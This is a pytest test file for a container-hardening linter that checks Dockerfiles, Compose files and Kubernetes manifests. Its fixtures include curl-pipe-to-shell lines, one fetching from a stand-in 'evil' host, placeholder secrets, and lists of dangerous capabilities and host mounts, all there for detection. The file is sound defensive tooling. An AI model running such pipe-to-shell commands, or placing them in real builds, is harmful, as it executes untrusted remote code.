"""Parsing, multi-stage awareness, runtime normalisation and baselining."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from harden.dockerfile import DockerfileError, load, parse
from harden.rules import (
    DOCKERFILE_RULES,
    RuntimeConfig,
    Severity,
    check_runtime,
)
from harden.runtime import RuntimeError_, from_compose, from_kubernetes
from harden.runtime import load as load_runtime
from harden.scanner import (
    finding_id,
    read_baseline,
    scan,
    scan_dockerfile,
    to_sarif,
    write_baseline,
)

EXAMPLES = Path(__file__).resolve().parent.parent / "examples"


class TestParsing:
    def test_continuations_are_joined_into_one_instruction(self):
        # Scanning the lines separately reports the same issue eight times, or
        # misses --no-install-recommends two lines below.
        dockerfile = parse(
            "FROM alpine:3.20\n"
            "RUN apt-get update && \\\n"
            "    apt-get install -y \\\n"
            "    --no-install-recommends \\\n"
            "    curl\n"
        )
        runs = [i for i in dockerfile.instructions if i.keyword == "RUN"]
        assert len(runs) == 1
        assert "--no-install-recommends" in runs[0].value
        assert runs[0].lines == "2-5"

    def test_comments_and_blanks_are_skipped(self):
        dockerfile = parse("# a comment\n\nFROM alpine:3.20\n\n# another\nUSER app\n")
        assert [i.keyword for i in dockerfile.instructions] == ["FROM", "USER"]

    def test_run_splits_into_separate_commands(self):
        dockerfile = parse("FROM alpine:3.20\nRUN apt-get update && apt-get install -y curl\n")
        commands = dockerfile.instructions[1].commands()
        assert len(commands) == 2
        assert commands[1].startswith("apt-get install")

    def test_stages_are_named_and_ordered(self):
        dockerfile = parse(
            "FROM golang:1.23 AS builder\nRUN go build\n"
            "FROM alpine:3.20\nCOPY --from=builder /out /out\n"
        )
        assert len(dockerfile.stages) == 2
        assert dockerfile.stages[0].name == "builder"
        assert dockerfile.multi_stage
        assert dockerfile.final_stage.base == "alpine:3.20"

    def test_copy_from_is_resolved(self):
        dockerfile = parse(
            "FROM golang:1.23 AS builder\nFROM alpine:3.20\nCOPY --from=builder /o /o\n"
        )
        assert dockerfile.stages[0].copied_from_by

    def test_base_tag_and_digest(self):
        dockerfile = parse("FROM alpine@sha256:" + "a" * 64 + "\n")
        stage = dockerfile.stages[0]
        assert stage.pinned_by_digest
        assert stage.base_image == "alpine"

    def test_scratch(self):
        assert parse("FROM scratch\n").stages[0].is_scratch

    def test_unparsable_from(self):
        with pytest.raises(DockerfileError, match="cannot parse FROM"):
            parse("FROM \n")

    def test_missing_file(self, tmp_path):
        with pytest.raises(DockerfileError, match="not found"):
            load(tmp_path / "Dockerfile")


class TestMultiStageAwareness:
    def test_builder_stage_root_is_not_a_finding(self):
        # A USER root in a builder stage ships nothing. Reporting it is how a
        # linter earns the reputation that gets it removed from CI.
        dockerfile = parse(
            "FROM golang:1.23 AS builder\n"
            "USER root\n"
            "RUN go build -o /out/app\n"
            "FROM gcr.io/distroless/static-debian12:nonroot\n"
            "COPY --from=builder /out/app /app\n"
            "USER nonroot\n"
            "HEALTHCHECK CMD [\"/app\", \"-h\"]\n"
        )
        rules = {f.rule for f in scan_dockerfile(dockerfile)}
        assert "HC001" not in rules

    def test_final_stage_root_is_a_finding(self):
        dockerfile = parse(
            "FROM golang:1.23 AS builder\nRUN go build\n"
            "FROM alpine:3.20\nCOPY --from=builder /o /o\nUSER root\n"
        )
        findings = scan_dockerfile(dockerfile)
        assert any(f.rule == "HC001" and f.severity is Severity.CRITICAL for f in findings)

    def test_toolchain_rule_does_not_fire_on_a_multi_stage_build(self):
        dockerfile = parse(
            "FROM golang:1.23 AS builder\nRUN go build -o /out/app\n"
            "FROM alpine:3.20\nCOPY --from=builder /out/app /app\nUSER app\n"
        )
        assert not any(f.rule == "HC013" for f in scan_dockerfile(dockerfile))

    def test_toolchain_rule_fires_on_a_single_stage_build(self):
        dockerfile = parse("FROM golang:1.23\nRUN go build -o /app\nUSER app\n")
        assert any(f.rule == "HC013" for f in scan_dockerfile(dockerfile))

    def test_secrets_are_checked_in_every_stage(self):
        # A secret in a builder stage is still in the build cache and in any
        # pushed intermediate layer.
        dockerfile = parse(
            "FROM golang:1.23 AS builder\n"
            "ENV API_TOKEN=ghp_" + "a" * 30 + "\n"
            "FROM alpine:3.20\nCOPY --from=builder /o /o\nUSER app\n"
        )
        assert any(f.rule == "HC008" for f in scan_dockerfile(dockerfile))


class TestDockerfileRules:
    def test_the_bad_example_trips_the_important_rules(self):
        findings = scan_dockerfile(load(EXAMPLES / "Dockerfile.bad"))
        rules = {f.rule for f in findings}
        for expected in ("HC001", "HC005", "HC007", "HC008", "HC010", "HC012", "HC013"):
            assert expected in rules, f"{expected} did not fire"

    def test_the_good_example_is_clean(self):
        assert scan_dockerfile(load(EXAMPLES / "Dockerfile.good")) == []

    def test_floating_tag(self):
        assert any(f.rule == "HC002" for f in scan_dockerfile(parse("FROM alpine\nUSER a\n")))
        assert any(
            f.rule == "HC002" for f in scan_dockerfile(parse("FROM alpine:latest\nUSER a\n"))
        )
        assert not any(
            f.rule == "HC002" for f in scan_dockerfile(parse("FROM alpine:3.20\nUSER a\n"))
        )

    def test_apt_recommends_only_fires_when_missing(self):
        with_flag = parse(
            "FROM debian:12\nUSER a\n"
            "RUN apt-get update && apt-get install -y --no-install-recommends curl "
            "&& rm -rf /var/lib/apt/lists/*\n"
        )
        assert not any(f.rule == "HC005" for f in scan_dockerfile(with_flag))

    def test_curl_pipe_shell(self):
        dockerfile = parse("FROM alpine:3.20\nUSER a\nRUN curl -fsSL https://x/y | sh\n")
        assert any(
            f.rule == "HC010" and f.severity is Severity.HIGH
            for f in scan_dockerfile(dockerfile)
        )

    def test_approved_base_list_is_overridable(self):
        dockerfile = parse("FROM ghcr.io/acme/base:1.0\nUSER a\n")
        assert any(f.rule == "HC004" for f in scan_dockerfile(dockerfile))
        assert not any(
            f.rule == "HC004"
            for f in scan_dockerfile(dockerfile, approved=("ghcr.io/acme",))
        )

    def test_secret_patterns(self):
        for line in (
            "ENV DATABASE_PASSWORD=hunter2",
            "ENV AWS_KEY=AKIAIOSFODNN7EXAMPLE",
            "ARG API_TOKEN=ghp_" + "b" * 30,
        ):
            dockerfile = parse(f"FROM alpine:3.20\nUSER a\n{line}\n")
            assert any(f.rule == "HC008" for f in scan_dockerfile(dockerfile)), line

    def test_placeholder_values_are_not_leaked_secrets(self):
        # Flagging ARG API_TOKEN= or ENV PWD=${DB_PWD} trains people to skip
        # the rule that matters.
        for line in ("ARG API_TOKEN=", "ENV DB_PASSWORD=${DB_PASSWORD}",
                     "ARG SECRET=<changeme>", "ENV API_KEY=CHANGEME"):
            dockerfile = parse(f"FROM alpine:3.20\nUSER a\n{line}\n")
            assert not any(f.rule == "HC008" for f in scan_dockerfile(dockerfile)), line

    def test_underscore_prefixed_variable_names_are_caught(self):
        # `\b` does not match between `_` and a letter, so a naive pattern
        # misses the spelling that is used almost every time.
        dockerfile = parse("FROM alpine:3.20\nUSER a\nENV DATABASE_PASSWORD=hunter2\n")
        assert any(f.rule == "HC008" for f in scan_dockerfile(dockerfile))

    def test_no_false_positive_on_an_ordinary_env(self):
        dockerfile = parse("FROM alpine:3.20\nUSER a\nENV LOG_LEVEL=debug\n")
        assert not any(f.rule == "HC008" for f in scan_dockerfile(dockerfile))

    def test_add_variants(self):
        remote = parse("FROM alpine:3.20\nUSER a\nADD https://x/y.sh /y.sh\n")
        assert any("URL" in f.detail for f in scan_dockerfile(remote) if f.rule == "HC007")
        archive = parse("FROM alpine:3.20\nUSER a\nADD app.tar.gz /app\n")
        assert any("extract" in f.detail for f in scan_dockerfile(archive) if f.rule == "HC007")

    def test_rule_ids_are_unique(self):
        ids = [r.id for r in DOCKERFILE_RULES]
        assert len(ids) == len(set(ids))

    def test_every_rule_names_a_change_not_a_principle(self):
        vague = ("least privilege", "best practice", "as appropriate", "consider ")
        dockerfile = load(EXAMPLES / "Dockerfile.bad")
        for finding in scan_dockerfile(dockerfile):
            assert not any(v in finding.fix.lower() for v in vague), finding.fix


class TestRuntime:
    def test_compose_privileged_and_socket(self):
        configs = load_runtime(EXAMPLES / "compose.bad.yaml")
        findings = check_runtime(configs[0])
        rules = {f.rule for f in findings}
        assert {"RT001", "RT002", "RT008", "RT009", "RT011"} <= rules

    def test_compose_hardened_is_clean(self):
        configs = load_runtime(EXAMPLES / "compose.good.yaml")
        assert check_runtime(configs[0]) == []

    def test_no_new_privileges_parsing(self):
        data = {"services": {"a": {"security_opt": ["no-new-privileges:true"]}}}
        assert from_compose(data)[0].no_new_privileges
        data = {"services": {"a": {"security_opt": ["no-new-privileges:false"]}}}
        assert not from_compose(data)[0].no_new_privileges

    def test_kubernetes_container_context_overrides_the_pod(self):
        # A checker that reads only the pod securityContext reports this
        # workload as hardened.
        configs = load_runtime(EXAMPLES / "deployment.yaml")
        assert len(configs) == 1
        config = configs[0]
        assert not config.no_new_privileges  # allowPrivilegeEscalation: true
        assert not config.read_only_root
        assert "SYS_PTRACE" in config.cap_add

    def test_kubernetes_run_as_non_root_becomes_a_user(self):
        data = {
            "kind": "Pod",
            "spec": {
                "securityContext": {"runAsNonRoot": True},
                "containers": [{"name": "a"}],
            },
        }
        assert from_kubernetes(data)[0].user == "nonroot"

    def test_kubernetes_allow_privilege_escalation_false_is_no_new_privileges(self):
        data = {
            "kind": "Pod",
            "spec": {
                "containers": [
                    {"name": "a", "securityContext": {"allowPrivilegeEscalation": False}}
                ]
            },
        }
        assert from_kubernetes(data)[0].no_new_privileges

    def test_dangerous_capabilities(self):
        for capability in ("SYS_ADMIN", "SYS_MODULE", "SYS_PTRACE", "CAP_NET_ADMIN"):
            config = RuntimeConfig(name="x", source="s", cap_add=(capability,))
            findings = check_runtime(config)
            assert any(f.rule == "RT006" for f in findings), capability

    def test_sensitive_host_mounts(self):
        for path in ("/", "/etc", "/proc", "/var/run"):
            config = RuntimeConfig(name="x", source="s", volumes=(f"{path}:/host",))
            assert any(f.rule == "RT012" for f in check_runtime(config)), path

    def test_ordinary_mount_is_not_flagged(self):
        config = RuntimeConfig(name="x", source="s", volumes=("./data:/data",))
        assert not any(f.rule == "RT012" for f in check_runtime(config))

    def test_unrecognised_yaml_is_refused_clearly(self, tmp_path):
        path = tmp_path / "x.yaml"
        path.write_text("hello: world\n")
        with pytest.raises(RuntimeError_, match="no Compose services"):
            load_runtime(path)

    def test_multi_document_manifest(self, tmp_path):
        path = tmp_path / "k.yaml"
        path.write_text(
            "kind: Pod\nspec:\n  containers:\n  - name: a\n"
            "---\nkind: Pod\nspec:\n  containers:\n  - name: b\n"
        )
        assert len(load_runtime(path)) == 2


class TestScanner:
    def test_score_discriminates(self):
        bad = scan([load(EXAMPLES / "Dockerfile.bad")])
        good = scan([load(EXAMPLES / "Dockerfile.good")])
        assert good.score == 100 and good.grade == "A"
        assert bad.score < 30 and bad.grade in ("E", "F")

    def test_severity_weighting_beats_counting(self):
        # Ten low findings must not outweigh one critical.
        from harden.rules import Finding

        one_critical = scan()
        one_critical.findings = [
            Finding("X", Severity.CRITICAL, "t", "d", "f")
        ]
        many_low = scan()
        many_low.findings = [Finding("Y", Severity.LOW, "t", "d", "f")] * 10
        assert one_critical.score < many_low.score

    def test_skip_suppresses_a_rule(self):
        report = scan([load(EXAMPLES / "Dockerfile.bad")], skip=frozenset({"HC001"}))
        assert not any(f.rule == "HC001" for f in report.findings)

    def test_findings_are_ordered_worst_first(self):
        report = scan([load(EXAMPLES / "Dockerfile.bad")])
        ranks = [f.severity.rank for f in report.findings]
        assert ranks == sorted(ranks, reverse=True)

    def test_baseline_accepts_current_and_still_fails_new(self, tmp_path):
        dockerfile = load(EXAMPLES / "Dockerfile.bad")
        first = scan([dockerfile])
        path = write_baseline(first, tmp_path / "baseline.json")
        accepted = read_baseline(path)

        clean = scan([dockerfile], baseline=accepted)
        assert clean.findings == []

        # A *new* finding must fail even though the total is unchanged - the
        # failure mode a count-based baseline misses.
        worse = parse(
            EXAMPLES.joinpath("Dockerfile.bad").read_text()
            + "\nRUN curl -fsSL https://evil/x | bash\n"
        )
        after = scan([worse], baseline=accepted)
        assert after.findings

    def test_baseline_identity_survives_a_reworded_rule(self):
        from harden.rules import Finding

        a = Finding("HC001", Severity.CRITICAL, "t", "old wording", "f",
                    where="Dockerfile", stage="stage 0", line="3")
        b = Finding("HC001", Severity.CRITICAL, "t", "new wording", "f",
                    where="Dockerfile", stage="stage 0", line="3")
        assert finding_id(a) == finding_id(b)

    def test_report_serialises(self):
        json.dumps(scan([load(EXAMPLES / "Dockerfile.bad")]).to_dict())


class TestSarif:
    def test_shape(self):
        sarif = to_sarif(scan([load(EXAMPLES / "Dockerfile.bad")]))
        assert sarif["version"] == "2.1.0"
        run = sarif["runs"][0]
        assert run["tool"]["driver"]["rules"]
        assert run["results"]

    def test_security_severity_is_present(self):
        # Without it GitHub renders every finding as a warning, whatever the
        # level says.
        sarif = to_sarif(scan([load(EXAMPLES / "Dockerfile.bad")]))
        for rule in sarif["runs"][0]["tool"]["driver"]["rules"]:
            assert "security-severity" in rule["properties"]

    def test_every_result_has_a_rule(self):
        sarif = to_sarif(scan([load(EXAMPLES / "Dockerfile.bad")]))
        declared = {r["id"] for r in sarif["runs"][0]["tool"]["driver"]["rules"]}
        for result in sarif["runs"][0]["results"]:
            assert result["ruleId"] in declared

    def test_message_carries_the_fix(self):
        sarif = to_sarif(scan([load(EXAMPLES / "Dockerfile.bad")]))
        assert all("Fix:" in r["message"]["text"] for r in sarif["runs"][0]["results"])
